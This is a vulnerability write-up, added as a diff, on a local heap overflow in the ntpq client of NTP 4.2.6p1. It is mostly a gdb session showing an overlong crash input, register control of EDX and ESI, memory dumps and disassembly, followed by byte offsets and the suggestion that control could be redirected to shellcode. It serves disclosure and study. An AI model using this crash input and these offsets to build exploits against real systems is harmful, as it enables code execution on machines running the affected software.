@@ -1,0 +1,129 @@
+Linux NTP query client v4.2.6p1 Heap Overflow vulnerability
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+vendor: http://www.ntp.org/
+software: http://www.eecis.udel.edu/~ntp/ntp_spool/ntp4/ntp-4.2/ntp-4.2.6p1.tar.gz
+impact: minor/informational
+
+There is a local heap overflow in the ntpq utility client that comes packaged in ntp-4.2.6p1-2.fc13. 
+Note: The binary is NOT suid/guid enabled on my system. 
+Nonetheless, it provides some fun/interesting analysis.
+
+mr_me@pluto ~]$ yum list installed | grep ntp
+fontpackages-filesystem.noarch   1.44-1.fc13             @updates               
+ntp.i686                         4.2.6p1-2.fc13          @updates               
+ntpdate.i686                     4.2.6p1-2.fc13          @updates               
+
+[mr_me@pluto ~]$ /usr/sbin/ntpq --version
+ntpq - standard NTP query program - Ver. 4.2.6p1
+
+[mr_me@pluto ~]$ gdb /usr/sbin/ntpq 
+GNU gdb (GDB) Fedora (7.1-34.fc13)
+Copyright (C) 2010 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-redhat-linux-gnu".
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>...
+Reading symbols from /usr/sbin/ntpq...(no debugging symbols found)...done.
+Missing separate debuginfos, use: debuginfo-install ntp-4.2.6p1-2.fc13.i686
+
+(gdb) r
+Starting program: /usr/sbin/ntpq 
+[Thread debugging using libthread_db enabled]
+ntpq> AAAA {0x4ac} AAAABBBBAAAACCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..
+***Command `AAAA {0x4ac} AAAABBBBAAAACCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.. 'unknown
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7fab60d in el_gets () from /usr/lib/libedit.so.0
+
+(gdb) i r
+eax            0xbffff32c	-1073745108
+ecx            0x0	0
+edx            0x42424242	1111638594	< ---- full control
+ebx            0xb7fc5ac0	-1208198464
+esp            0xbffff260	0xbffff260
+ebp            0xbffff2c8	0xbffff2c8
+esi            0x43434343	1128481603	< ---- full control
+edi            0xbffff32c	-1073745108
+eip            0xb7fab60d	0xb7fab60d <el_gets+45>
+eflags         0x10282	[ SF IF RF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+pointers are everywhere, look @ esp, esp+0x4 and esp+0x10 we can see a pointers 
+to some controllable memory:
+
+(gdb) x/5x $esp
+0xbffff260:	0x0015b948	0x0015b948	0xbffff2c8	0x0012bd06
+0xbffff270:	0x0015b948
+
+(gdb) x/30x 0x0015b948
+0x15b948:	0x41414141	0x41414141	0x41414141	0x41414141
+0x15b958:	0x41414141	0x41414141	0x41414141	0x41414141
+0x15b968:	0x41414141	0x41414141	0x41414141	0x41414141
+0x15b978:	0x41414141	0x41414141	0x41414141	0x41414141
+0x15b988:	0x41414141	0x41414141	0x41414141	0x41414141
+0x15b998:	0x41414141	0x41414141	0x41414141	0x41414141
+0x15b9a8:	0x41414141	0x41414141	0x41414141	0x41414141
+0x15b9b8:	0x41414141	0x41414141
+
+(gdb) bt
+#0  0xb7fab60d in el_gets () from /usr/lib/libedit.so.0
+#1  0x0012c7b0 in ?? ()
+#2  0x001196a3 in ?? ()
+#3  0x0011978c in main ()
+
+(gdb) disas 0xb7fab60d
+Dump of assembler code for function el_gets:
+   0xb7fab5e0 <+0>:	push   %ebp
+   0xb7fab5e1 <+1>:	mov    %esp,%ebp
+   0xb7fab5e3 <+3>:	push   %edi
+   0xb7fab5e4 <+4>:	push   %esi
+   0xb7fab5e5 <+5>:	lea    -0x20(%ebp),%eax
+   0xb7fab5e8 <+8>:	push   %ebx
+   0xb7fab5e9 <+9>:	call   0xb7fa5469
+   0xb7fab5ee <+14>:	add    $0x1a4d2,%ebx
+   0xb7fab5f4 <+20>:	lea    -0x5c(%esp),%esp
+   0xb7fab5f8 <+24>:	mov    0xc(%ebp),%edi
+   0xb7fab5fb <+27>:	test   %edi,%edi
+   0xb7fab5fd <+29>:	mov    0x8(%ebp),%esi
+   0xb7fab600 <+32>:	cmovne 0xc(%ebp),%eax
+   0xb7fab604 <+36>:	mov    %eax,0xc(%ebp)
+   0xb7fab607 <+39>:	movl   $0x0,(%eax)
+=> 0xb7fab60d <+45>:	mov    0x14(%esi),%eax
+   0xb7fab610 <+48>:	test   $0x2,%al
+   0xb7fab612 <+50>:	je     0xb7fab6b0 <el_gets+208>
+   0xb7fab618 <+56>:	mov    0x30(%esi),%edi
+   0xb7fab61b <+59>:	mov    %edi,0x4(%esp)
+   0xb7fab61f <+63>:	mov    %esi,(%esp)
+   0xb7fab622 <+66>:	call   *0x324(%esi)
+   0xb7fab628 <+72>:	cmp    $0x1,%eax
+   0xb7fab62b <+75>:	mov    %eax,%ecx
+   0xb7fab62d <+77>:	jne    0xb7faba50 <el_gets+1136>
+   0xb7fab633 <+83>:	lea    0x1(%edi),%edx
+   0xb7fab636 <+86>:	cmp    0x3c(%esi),%edx
+   0xb7fab639 <+89>:	jae    0xb7fab680 <el_gets+160>
+   0xb7fab63b <+91>:	mov    %edi,%eax
+   0xb7fab63d <+93>:	mov    %edx,%edi
+   0xb7fab63f <+95>:	testb  $0x8,0x14(%esi)
+   0xb7fab643 <+99>:	jne    0xb7fab650 <el_gets+112>
+   0xb7fab645 <+101>:	movzbl (%eax),%eax
+   0xb7fab648 <+104>:	cmp    $0xa,%al
+   0xb7fab64a <+106>:	je     0xb7fab650 <el_gets+112>
+   0xb7fab64c <+108>:	cmp    $0xd,%al
+---Type <return> to continue, or q <return> to quit---
+
+The code access violates at 'mov eax, dword ptr [%esi+20]'. A this point, the EAX register can be controlled
+by setting a valid rw memory address into ESI+20. This will trigger a deference @ 0xb7fab60d and the value 
+of whatever is contained within ESI+20 will written to EAX. The offset to controlling EDX is 1204 bytes 
+and the offset to ESI is 1212 bytes.
+
+In summary, it is likley that the execution flow can be redirected to desired shellcode.
+
+~ mr_me
